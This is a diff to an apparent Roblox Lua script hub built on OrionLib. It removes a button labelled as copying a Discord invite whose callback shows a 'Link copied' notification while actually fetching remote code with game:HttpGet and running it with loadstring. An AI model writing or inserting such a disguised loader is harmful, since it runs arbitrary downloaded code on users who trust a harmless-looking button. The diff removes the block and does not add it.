@@ -6402,17 +6402,6 @@ Tab:AddButton({
 })
     setclipboard(tostring('https://discord.gg/f26Vp8CzaZ')) 
   	end    
-}) Tab:AddButton({
-	Name = "Click to copy discord Invite",
-	Callback = function()
-    OrionLib:MakeNotification({
-	Name = "Link copied",
-	Content = "Discord Invite copied to clipboard.",
-	Image = "rbxassetid://4483345998",
-	Time = 5
-})
-    loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/c05ff04390ed3ecd6256c217440672b2"))()
-  	end    
 })
 
 
